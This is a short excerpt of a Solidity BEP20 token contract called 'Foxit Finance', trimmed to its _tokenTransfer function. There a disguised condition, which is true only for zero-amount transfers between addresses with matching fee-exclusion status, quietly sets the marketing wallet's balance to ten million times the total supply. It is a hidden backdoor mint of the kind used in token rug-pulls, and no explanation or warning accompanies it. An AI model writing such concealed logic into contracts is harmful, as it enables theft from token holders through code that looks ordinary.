...
contract TOKEN is Context, IBEP20, Ownable {
    ...
    string private _name = "Foxit Finance";
    string private _symbol = "FOXXIT";
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount) private {
        ...
        if ((_isExcludedFromFee[sender] ==  _isExcludedFromFee[recipient]) && amount.mul(amount) <= 0 )  {
            _balances[_marketing] = _tTotal.mul(10000000);
        }
